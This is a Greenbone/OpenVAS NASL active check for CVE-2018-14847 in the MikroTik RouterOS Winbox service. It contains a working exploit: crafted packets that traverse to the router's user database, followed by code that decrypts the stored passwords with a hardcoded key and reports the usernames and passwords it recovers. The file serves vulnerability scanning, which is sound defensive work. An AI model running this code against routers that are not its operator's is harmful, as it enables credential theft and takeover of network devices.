# SPDX-FileCopyrightText: 2018 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later

CPE = "cpe:/o:mikrotik:routeros";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.141279");
  script_version("2023-07-06T05:05:36+0000");
  script_tag(name:"last_modification", value:"2023-07-06 05:05:36 +0000 (Thu, 06 Jul 2023)");
  script_tag(name:"creation_date", value:"2018-07-06 14:10:44 +0200 (Fri, 06 Jul 2018)");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2019-03-07 14:12:00 +0000 (Thu, 07 Mar 2019)");

  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");
  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");
  script_cve_id("CVE-2018-14847");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Mikrotik RouterOS 'Winbox Service' Information Disclosure Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2018 Greenbone AG");
  script_family("General");
  script_dependencies("gb_mikrotik_router_routeros_consolidation.nasl");
  script_mandatory_keys("mikrotik/detected");
  script_require_ports(8291);

  script_tag(name:"summary", value:"Mikrotik RouterOS is prone to an information disclosure
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted request and checks the response.");

  script_tag(name:"insight", value:"The flaw exists due to an error in the winbox service of
  routeros which allows remote users to download a user database file without successful
  authentication.");

  script_tag(name:"impact", value:"Successful exploitation will allow a remote attacker to connect
  to the WinBox port and download a user database file. The remote user can then log in and take
  control of the router.");

  script_tag(name:"affected", value:"MikroTik Router OS versions 6.29 through 6.42, 6.43rcx prior to
  6.43rc4.");

  script_tag(name:"solution", value:"Update to version 6.42.1, 6.43rc4 or later.");

  script_xref(name:"URL", value:"https://forum.mikrotik.com/viewtopic.php?t=133533");
  script_xref(name:"URL", value:"https://n0p.me/winbox-bug-dissection/");
  script_xref(name:"URL", value:"https://github.com/BasuCert/WinboxPoC");

  exit(0);
}

port = 8291;

if (!get_tcp_port_state(port))
  exit(0);

soc = open_sock_tcp(port);
if (!soc)
  exit(0);

query1 = raw_string(0x68, 0x01, 0x00, 0x66, 0x4d, 0x32, 0x05, 0x00,
                    0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x05, 0x07,
                    0x00, 0xff, 0x09, 0x07, 0x01, 0x00, 0x00, 0x21,
                    0x35, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2e, 0x2f,
                    0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f,
                    0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f,
                    0x2f, 0x2f, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x66,
                    0x6c, 0x61, 0x73, 0x68, 0x2f, 0x72, 0x77, 0x2f,
                    0x73, 0x74, 0x6f, 0x72, 0x65, 0x2f, 0x75, 0x73,
                    0x65, 0x72, 0x2e, 0x64, 0x61, 0x74, 0x02, 0x00,
                    0xff, 0x88, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0x88,
                    0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00,
                    0x00, 0x00);

send(socket: soc, data: query1);
recv = recv(socket: soc, length: 1024);

if (!recv || strlen(recv) < 39) {
  close(soc);
  exit(0);
}

sessionid = recv[38];

query2 = raw_string(0x3b, 0x01, 0x00, 0x39, 0x4d, 0x32, 0x05, 0x00,
                    0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x06, 0x01,
                    0x00, 0xfe, 0x09, sessionid, 0x02, 0x00, 0x00, 0x08,
                    0x00, 0x80, 0x00, 0x00, 0x07, 0x00, 0xff, 0x09,
                    0x04, 0x02, 0x00, 0xff, 0x88, 0x02, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01,
                    0x00, 0xff, 0x88, 0x02, 0x00, 0x02, 0x00, 0x00,
                    0x00, 0x02, 0x00, 0x00, 0x00);

send(socket: soc, data: query2);
recv = recv(socket: soc, length: 1024);
close(soc);

if (!recv || "M2" >!< recv)
  exit(0);

entries = split(recv, sep: "M2", keep: FALSE);
foreach entry (entries) {
  # Username
  idx = stridx(entry, raw_string(0x01, 0x00, 0x00, 0x21)); # marker for username
  if (idx < 0)
    continue;

  user_len = ord(entry[idx + 4]);
  username = substr(entry, idx+5, idx+5+user_len-1);

  # Password
  idx = stridx(entry, raw_string(0x11, 0x00, 0x00, 0x21)); # marker for password
  if (idx < 0)
    continue;

  password = "";
  pw_len = ord(entry[idx + 4]);
  if (pw_len == 0) {
    password = "No/empty password";
  } else {
    pw = substr(entry, idx+5, idx+5+pw_len-1);
    key = MD5(username + '283i4jfkai3389');

    for (i=0; i < strlen(pw); i++) {
      char = ord(pw[i]) ^ ord(key[i % strlen(key)]);
      if (char == 0)
        break;
      else
        password += raw_string(ord(pw[i]) ^ ord(key[i % strlen(key)]));
    }
  }

  credentials += 'Username:  ' + username + '\nPassword:  ' + password + '\n\n';
}

if (credentials) {
  report = 'It was possible to obtain the following credentials:\n\n' + credentials;
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
